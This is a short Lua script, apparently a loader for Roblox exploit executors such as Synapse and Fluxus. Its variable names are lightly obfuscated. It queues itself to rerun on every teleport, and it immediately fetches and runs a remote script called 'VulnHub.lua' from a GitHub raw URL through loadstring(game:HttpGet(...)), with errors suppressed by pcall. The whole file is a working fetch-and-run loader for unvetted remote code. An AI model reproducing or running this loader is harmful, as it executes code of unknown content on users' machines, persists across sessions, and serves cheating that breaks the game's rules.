local _0x1a = syn and syn.queue_on_teleport or queue_on_teleport or flux and flux.queue_on_teleport
local _0x2b = "https://raw.githubusercontent.com/leos00281-eng/Rbx/refs/heads/main/VulnHub.lua"

if _0x1a then
    _0x1a([[
        task.spawn(function()
            if not game:IsLoaded() then
                game.Loaded:Wait()
            end
            task.wait(3)
            pcall(function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/leos00281-eng/Rbx/refs/heads/main/VulnHub.lua"))()
            end)
        end)
    ]])
end

task.spawn(function()
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end
    pcall(function()
        loadstring(game:HttpGet(_0x2b))()
    end)
end)
